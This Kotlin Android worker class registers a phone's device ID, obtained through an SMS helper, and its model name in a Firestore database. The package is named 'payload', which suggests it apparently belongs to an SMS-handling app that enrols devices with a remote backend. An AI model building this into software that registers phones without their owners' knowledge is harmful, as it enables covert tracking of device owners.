package com.payload.jansiix0ne.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.payload.jansiix0ne.data.model.DeviceModel
import com.payload.jansiix0ne.data.repository.FirestoreRepository
import com.payload.jansiix0ne.util.SmsHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Worker that registers device information to Firestore
 */
class RegisterUserWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val firestoreRepository = FirestoreRepository()

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val deviceId = SmsHelper.getDeviceId(applicationContext)
            
            // Get device information
            val deviceModel = DeviceModel(
                deviceId = deviceId,
                mobileName = android.os.Build.MODEL,
                charge = "0" // TODO: Get actual battery level
            )
            
            val result = firestoreRepository.saveDeviceInfo(deviceId, deviceModel)
            
            if (result.isSuccess) {
                Log.d(TAG, "Device registered successfully: $deviceId")
                Result.success()
            } else {
                Log.e(TAG, "Failed to register device: ${result.exceptionOrNull()?.message}")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in RegisterUserWorker: ${e.message}", e)
            Result.failure()
        }
    }

    companion object {
        private const val TAG = "RegisterUserWorker"
    }
}
